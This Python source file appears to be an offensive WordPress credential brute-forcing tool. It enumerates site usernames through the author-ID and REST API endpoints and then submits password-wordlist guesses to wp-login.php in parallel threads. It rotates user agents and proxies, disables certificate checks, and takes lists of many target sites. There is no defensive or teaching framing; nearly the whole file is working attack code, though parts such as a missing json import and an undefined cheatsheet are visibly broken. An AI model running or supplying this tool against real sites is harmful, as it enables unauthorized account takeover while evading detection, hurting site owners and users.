import os
import re
import ssl
import time
import random
import logging
import urllib.parse
import urllib.request

from pathlib import Path
from datetime import datetime
from argparse import FileType
from argparse import SUPPRESS
from argparse import ArgumentParser
from concurrent.futures import as_completed
from concurrent.futures import ThreadPoolExecutor

from userAgents import *


RED = '\u001b[31m'
GREEN = '\u001b[32m'
RESET = '\u001b[0m'

""" logger """
LOGGERNAME = Path(__file__).stem
logging.basicConfig(format="[%(asctime)s][%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger(LOGGERNAME)
log.setLevel(logging.INFO)
logging.addLevelName(60, "SUCCESS")


def success(self, message, *args, **kws):
    if self.isEnabledFor(60):
        self._log(60, message, args, **kws)


logging.Logger.success = success
logging.addLevelName(70, "FAILED")


def failed(self, message, *args, **kws):
    if self.isEnabledFor(70):
        self._log(70, message, args, **kws)


logging.Logger.failed = failed

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def proxy(content):
    try:
        proxys = []
        content = content.readlines()
        for line in content:
            proxys.append(line.replace("\n", ""))
        return proxys
    except:
        return content


""" site masks """
def url_mask(url, mask):
    urls = []
    domain_pattern = re.compile(r"http[s]?://(.*?)/")

    content = url.readlines()
    for line in content:
        # domain = str(re.findall(domain_pattern, line)[0])
        # if mask == "UPPER":
        #     masked_domain = domain.upper()
        # elif mask == "LOWER":
        #     masked_domain = domain.lower()
        # elif mask == "TITLE":
        #     masked_domain = domain.title()
        # elif mask == "REVERSE":
        #     masked_domain = domain[::-1]
        # elif mask == "UPPER-REVERSE":
        #     masked_domain = domain.upper()[::-1]
        # elif mask == "LOWER-REVERSE":
        #     masked_domain = domain.lower()[::-1]
        # elif mask == "TITLE-REVERSE":
        #     masked_domain = domain.title()[::-1]
        # elif "MINUS" in mask:
        #     length = int(mask[-1:])
        #     masked_domain = domain[:-length]
        # else:
        #     masked_domain = domain

        urls.append(line.replace("\n", ""))

    return urls


""" wordlist """
def pwd_mask(content, mask):
    lists = []
    content = content.readlines()
    for line in content:
        if mask == "UPPER":
            lists.append(line.replace("\n", "").upper())
        elif mask == "LOWER":
            lists.append(line.replace("\n", "").lower())
        elif mask == "TITLE":
            lists.append(line.replace("\n", "").title())
        elif mask == "REVERSE":
            lists.append(line.replace("\n", "")[::-1])
        elif mask == "UPPER-REVERSE":
            lists.append(line.replace("\n", "").upper()[::-1])
        elif mask == "LOWER-REVERSE":
            lists.append(line.replace("\n", "").lower()[::-1])
        elif mask == "TITLE-REVERSE":
            lists.append(line.replace("\n", "").title()[::-1])
        elif "MINUS" in mask:
            lists.append(line.replace("\n", "")[:-int(mask[-1:])])
        else:
            lists.append(line.replace("\n", ""))

    log.debug(f"Using wordlist mask: {mask}")
    return lists

def recognize(url):
    i = 1
    users = []
    log.debug(f"Brute Forcing users IDs: {url}") #  /?author=
    if "/wp-login.php/" in url:
        url = str(url).replace("/wp-login.php/", "")
    try:
        while True:
            with urllib.request.urlopen(f'{url}/?author={i}') as response:
                html = response.read()
                title_pattern = re.compile(r"<title>(.*?)</title>")
                matches = re.findall(title_pattern, str(html))
                if matches:
                    user = str(matches[0]).split()[0]
                    log.debug(GREEN + user + RESET)
                    users.append(user)
                    i += 1

        log.debug(f"Querying users: {url}") # /wp-json/wp/v2/users
        with urllib.request.urlopen(f'{url}/wp-json/wp/v2/users') as response:
                    html = response.read()
                    data = json.loads(html)
                    for i in data:
                        log.debug(GREEN + i["name"] + RESET)
                        if str(i['name']) not in users:
                            users.append(str(i['name']))
        if users != []:
            log.debug(f"USERS FOUND: {url} | {users}")
    
    except urllib.error.HTTPError:
        pass
    except:
        log.failed(RED + f"RECOGNIZE FAILED: {url} (not vulnerable/not exist)" + RESET)
    
    return users


def login(url, username, password, timeout, proxy):
    global userAgent

    url = urllib.parse.urljoin(url, "/wp-login.php/")
    form = f"log={username}&pwd={password}"
    form = bytes(form, "utf-8")

    headers = {
        "User-Agent": random.choice(userAgent),
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    request = urllib.request.Request(url, data=form, headers=headers)

    if proxy is not None:
        proxy = random.choice(proxy)
        request.set_proxy(str(proxy).replace("://", " ").split()[1], str(proxy).replace("://", " ").split()[0]) 

    with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
        if re.search("wp-admin", response.url):
            return password
        else:
            log.debug("FAILED: {}:{}".format(username, password))
            return False


def brutforce(url, user, password, proxy):
    try:
        request = urllib.request.Request(url)
        urllib.request.urlopen(request, timeout=args.timeout, context=context)
        
        start_time = time.time()
        success_login = False

        if len(password) > 1:
            log.debug("Total data: " + str(len(password)) + " words")


        with ThreadPoolExecutor(max_workers=args.thread) as executor:
            
            processed = (executor.submit(login, url, user, pwd, args.timeout, proxy) for pwd in password)
            for i, process in enumerate(as_completed(processed)):
                if len(password) > 1:
                        print("[{}][INFO] Testing: {} password".format(datetime.now().strftime("%H:%M:%S") ,i), end="\r")

                process = process.result()
                if process is not False:
                    success_login = True
                    password = process
                    break

            if success_login is True:
                log.success(GREEN + f"FOUND: {url} | {user}:{password}" + RESET)
                executor.shutdown(wait=False, cancel_futures=True)
                return True
            else:
                log.failed(RED + f"NFOUND: {url} | {user}" + RESET)

    except urllib.error.URLError as e:
        log.fatal(RED+f"Fatal error: {url} | {e}"+RESET)


if __name__ == "__main__":
    """ argument """
    parser = ArgumentParser(usage="python %(prog)s -t http://site.com/ -U users.txt -P wordlist.txt [-v -m REVERSE --thread 8 ... ]")
    parser.add_argument("-c", "--cheatsheet", action="store_true", help="Output cheatsheet for mask, site-mask")
    parser.add_argument("-v", "--verbose", action="store_const", const=logging.DEBUG, help="verbose mode")
    parser.add_argument("-a", "--auto", action="store_true", help="Automaticaly recognizing and brutforcing users")

    target = parser.add_argument_group("arguments")
    target.add_argument("-t", "--target", dest="url", metavar="", help="Target url (ex: https://mysite.com/)")
    target.add_argument("-T", "--wtarget", dest="url_list", type=FileType('r', encoding="utf-8"), metavar="", help="File of the targets (ex: sites.txt)")
    target.add_argument("-m", "--mask", dest="mask", metavar="", default="None", help="Mask for passwords; Try -c/--cheatsheet")
    target.add_argument("-s", "--site-mask", dest="url_mask", metavar="", default="None", help="Mask for sites; Try -c/--cheatsheet")

    target.add_argument("-u", "--username", dest="usr", metavar="", help="Username of the targets (ex: users.txt)")
    target.add_argument("-U", "--wusers", dest="usr_list",type=FileType('r', encoding="utf-8"), metavar="", help="using wordlist for usernames")
    target.add_argument("-p", "--password", dest="pwd", metavar="", help="password of the targets (ex: passwords.txt)")
    target.add_argument("-P", "--wpassword", dest="pwd_list",type=FileType('r', encoding="utf-8"), metavar="", help="using wordlist for passwords")
    
    request = parser.add_argument_group("other")
    request.add_argument("--timeout", metavar="", type=int, default=5, help="timed out for requests (default: %(default)s)")
    request.add_argument("--thread", metavar="", type=int, default=5, help="numbers of threading (default: %(default)s)")
    request.add_argument("--proxy", metavar="", help="using a proxy (ex: 127.0.0.1:8080)")
    request.add_argument("--proxy-list", dest="proxy_list", type=FileType('r', encoding="utf-8"), metavar="", help="using list with proxy (support: http, https)")
    args = parser.parse_args()

    log.info("Initialization successful!")

    if args.verbose:
        log.setLevel(args.verbose)

    if args.cheatsheet:
        print(cheatsheet)
        os._exit(1)

    if args.pwd:
        passwords = [args.pwd]
    elif args.pwd_list:
        log.debug("Loading wordlist: [passwords]")
        passwords = pwd_mask(args.pwd_list, args.mask)
    else:            
        parser.error("Password argument not found!\nTry -p/-P arguments")

    if args.usr:
        usernames = [args.usr]
    elif args.usr_list:
        log.debug("Loading wordlist: [users]")
        usernames = pwd_mask(args.usr_list, "None")
    else:
        if args.auto:
            log.debug("Using recognizing method")
        else:
            parser.error("Username argument not found!\nTry -u/-U arguments")

    if args.url:
        urls = [args.url]
    elif args.url_list:
        log.debug("Loading wordlist: [urls]")
        urls = url_mask(args.url_list, args.url_mask)
    else:
        parser.error("Sites argument not found!\nTry -t/-T arguments")

    if args.proxy_list:
        proxy = proxy(args.proxy_list)
    elif args.proxy:
        proxy = [args.proxy]
    else:
        proxy = None

    try:
        if args.auto:
            for url in urls: 
                users = recognize(url)
                if len(users) > 1:
                    log.info(f" EXTRACT: {url} | {GREEN+str(users)+RESET}")
                for user in users:
                    log.info(f" TESTING: {url} | {user}")
                    brutforce(url, user, passwords, proxy)
        else:
            for url in urls:
                for user in usernames:
                    brutforce(url, user, passwords, proxy)
                    
    except KeyboardInterrupt:
        print("\nBye!!!")
        os._exit(1)
    except:
        print("Something went wrong. Check your inputs :(")